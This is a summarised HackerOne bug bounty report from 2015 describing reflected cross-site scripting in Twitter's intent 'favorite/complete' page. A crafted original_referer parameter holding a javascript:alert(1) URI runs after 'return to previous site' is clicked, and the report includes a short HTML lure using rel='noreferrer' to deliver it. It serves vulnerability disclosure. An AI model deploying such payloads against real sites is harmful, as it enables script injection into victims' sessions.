# XSS in original referrer after follow

## Metadata
- **Source:** HackerOne
- **Report:** 50134 | https://hackerone.com/reports/50134
- **Submitted:** 2015-03-05
- **Reporter:** akhil-reni
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
**Hey hi,**

There is a XSS in the intent functionality , 

Steps to reproduce
=======================

1)  copy paste the following Link 
https://twitter.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;

2) Click follow 

3) now click return to previous site, you will see a xss triggered.

Requirements
======

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Hey hi,**

There is a XSS in the intent functionality , 

Steps to reproduce
=======================

1)  copy paste the following Link 
https://twitter.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;

2) Click follow 

3) now click return to previous site, you will see a xss triggered.

Requirements
====================
- Make sure you pick a tweet of a user , that you don't follow.
- to execute you need to send a null referrer.

Here is the html code to attack victims
=====================================
`<html>
<a href="https://twitter.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;
" rel="noreferrer">click here and follow</a>
</html>`

**a rel=noreferrer will do our work.**

**Regards
Wesecureapp**

</details>

---
*Analysed by Claude on 2026-05-24*
